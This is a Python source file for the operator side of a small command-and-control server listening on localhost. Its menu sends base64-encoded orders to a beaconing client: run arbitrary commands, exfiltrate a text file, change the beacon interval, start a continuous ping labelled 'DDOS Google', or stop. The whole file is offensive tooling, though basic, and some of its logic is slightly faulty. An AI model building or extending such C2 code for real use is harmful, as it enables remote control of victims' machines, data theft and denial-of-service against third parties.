import socketserver  
import base64
import time

class MyTCPHandler(socketserver.BaseRequestHandler):
    """ 
    """

    def handle(self):
        self.data = self.request.recv(2048).strip().decode('utf-8')
        print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))

        option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 

        # Run a command
        if option == "1":
            command = input("Enter command: ")

            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")

            self.request.sendall(bytes(encodedcommand, "utf-8"))
            self.data = self.request.recv(2048).strip().decode('utf-8')
            print(self.data)
            
        # Exfil text file
        elif option == "2":
            command = "type test.txt"
            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
            self.request.sendall(bytes(encodedcommand, "utf-8"))
            
            self.data = self.request.recv(2048).strip().decode('utf-8')

            f = open("testexfil.txt", "a")
            f.write("\n" + self.data)
            f.close()
            print("testexfil.txt exfiltrated")

        # change beaconing interval
        elif option == "3":

            min = input("Minimum beaconing interval (seconds): ")
            max = input("Maximum beaconing interval (seconds): ")
            
            if max >= min:
                # Tell the client we are changing the interval
                interval = "INTERVAL"
                interval = base64.b64encode(interval.encode("utf-8")).decode("utf-8")
                self.request.sendall(bytes(interval, "utf-8"))
                time.sleep(1)
                self.request.sendall(bytes(min, "utf-8"))
                self.request.sendall(bytes(max, "utf-8"))
            else:
                print("Please enter a valid min and max")
        
        elif option == "4":
            command = "PING"
            interval = base64.b64encode(command.encode("utf-8")).decode("utf-8")
            self.request.sendall(bytes(interval, "utf-8"))
            print("Pinging 8.8.8.8")
            
        else:
            command = "exit"
            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
            self.request.sendall(bytes(encodedcommand, "utf-8"))

    def menu():
        print("Type exit to stop beacon")

if __name__ == "__main__":
    HOST, PORT = "localhost", 9999

    # Create the server, binding to localhost on port 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        server.serve_forever()